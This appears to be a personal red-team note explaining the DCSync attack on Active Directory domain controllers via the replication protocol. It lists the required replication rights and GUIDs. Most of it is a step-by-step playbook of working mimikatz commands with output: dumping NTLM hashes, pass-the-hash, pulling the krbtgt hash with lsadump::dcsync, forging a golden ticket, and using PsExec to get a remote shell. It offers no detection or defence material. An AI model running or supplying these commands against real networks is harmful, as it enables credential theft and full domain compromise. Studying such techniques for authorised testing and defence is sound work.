Domain Controller Synchronization

To read : 
[[MS-DRSR - Directory Replication Service Remote Protocol]]

Source : 
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync
https://www.netwrix.com/privilege_escalation_using_mimikatz_dcsync.html

Adversary simulate the behavior's of a domain controller (DC) and retrieve password data via domain replication.
Use of the protocol [[MS-DRSR - Directory Replication Service Remote Protocol]] to simulate the behavior of a domain controller and ask other domain controllers to replicate information

A domain controller may request an update for a specific object, like an account, with the `IDL_DRSGetNCChanges` API.

Luckily for us, the domain controller receiving a request for an update **does not verify that the request came from a known domain controller**, but **only that the associated SID has appropriate privileges**.

If we attempt to issue a **rogue update request from a user who is a member of the Domain Admins group** to a domain controller , it will succeed.

Can be used to retrieve the KRBTGT hash

### Known permissions to achieve DC Sync 
Administrators, Domain Admins and Enterprise Admins have the rights required to execute a DCSync attack.
- The “[**DS-Replication-Get-Changes**](https://msdn.microsoft.com/en-us/library/ms684354(v=vs.85).aspx)” extended right
    - **CN:** DS-Replication-Get-Changes
    - **GUID:** 1131f6aa-9c07-11d1-f79f-00c04fc2dcd
- The “[**Replicating Directory Changes All**](https://msdn.microsoft.com/en-us/library/ms684355(v=vs.85).aspx)” extended right
    - **CN:** DS-Replication-Get-Changes-All
    - **GUID:** 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
- The “[**Replicating Directory Changes In Filtered Set**](https://msdn.microsoft.com/en-us/library/hh338663(v=vs.85).aspx)” extended right (this one isn’t always needed but we can add it just in case :)
    - **CN:** DS-Replication-Get-Changes-In-Filtered-Set
    - **GUID:** 89e95b76-444d-4c62-991a-0facbeda640c

### Attack process
1. The attacker discovers a domain controller to request replication.
2. The attacker requests user replication using the [GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI)
3. The DC returns replication data to the requestor, including password hashes.

## Step of DCSYNC

### Get account with replication permission

Example with pass the hash
```powershell
PS> .\mimikatz.exe "privilege::debug" "sekurlsa::msv"
mimikatz # sekurlsa::msv
 
Authentication Id : 0 ; 4018372 (00000000:003d50c4)
Session           : RemoteInteractive from 2
User Name         : PrivUser1
Domain            : Domain
Logon Server      : DC1
Logon Time        : 15/07/2020 20:28:33
SID               : S-1-5-21-5840559-2756745051-1363507867-1105
        msv :
         [00000003] Primary
         * Username : PrivUser1
         * Domain   : Domain
         * NTLM     : eed224b4784bb040aab50b8856fe9f02
         * SHA1     : 42f95dd2a124ceea737c42c06ce7b7cdfbf0ad4b
         * DPAPI    : eb62f5bb2cc136b30a19c1d11b81dc77
 
PS> .\mimikatz.exe "sekurlsa::pth /user:PrivUser1 /ntlm:eed224b4784bb040aab50b8856fe9f02 /domain:domain.com"
 
user    : PrivUser1
domain  : Domain.com
program : cmd.exe
impers. : no
NTLM    : eed224b4784bb040aab50b8856fe9f02
  |  PID  6020
  |  TID  3336
  |  LSA Process is now R/W
  |  LUID 0 ; 14438952 (00000000:00dc5228)
  \_ msv1_0   - data copy @ 0000025C281A86C0 : OK !
  \_ kerberos - data copy @ 0000025C27D08608
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000025C287FF6A8 (32) -> null
```

### Use the account to perform the replication

#### Using DSInternal module


```powershell
Get-ADReplAccount -user Administrator -domain contoso –server dc01
```
#### Using mimikatz

```powershell
PS> .\mimikatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt"
 
[DC] 'domain.com' will be the domain
[DC] 'DC1.DOMAIN.com' will be the DC server
[DC] 'DOMAIN\krbtgt' will be the user account
 
Object RDN           : krbtgt
 
** SAM ACCOUNT **
 
SAM Username         : krbtgt
User Principal Name  : krbtgt@DOMAIN.COM
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 09/03/2020 14:51:03
Object Security ID   : S-1-5-21-5840559-2756745051-1363507867-502
Object Relative ID   : 502
 
Credentials:
  Hash NTLM: 1b8cee51fd49e55e8c9c9004a4acc159
 
# ... output truncated ...
 
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOMAIN.COMkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ffa8bd983a5a03618bdf577c2d79a467265f140ba339b89cc0a9c1bfdb4747f5
      aes128_hmac       (4096) : 471644de05c4834cc6cbc06896210e7d
      des_cbc_md5       (4096) : 23861a94ea83a4cd
 
# ... output truncated ...
```

### Achieve additional objectif

Can made a [[Golden Tickets]] attack

```powershell
PS> .\mimikatz.exe "kerberos::golden /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /krbtgt:1b8cee51fd49e55e8c9c9004a4acc159 /user:Administrator /id:500 /ptt"
 
User      : Administrator
Domain    : domain.com (DOMAIN)
SID       : S-1-5-21-5840559-2756745051-1363507867
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 1b8cee51fd49e55e8c9c9004a4acc159 - rc4_hmac_nt
Lifetime  : 16/07/2020 13:53:58 ; 14/07/2030 13:53:58 ; 14/07/2030 13:53:58
-> Ticket : ** Pass The Ticket **
 
 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated
 
Golden ticket for 'Administrator @ domain.com' successfully submitted for current session
 
PS> PSExec.exe \\fileserver1 powershell.exe
 
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
 
 
Microsoft Windows [Version 10.0.17763.1339]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32>hostname
fileserver1
```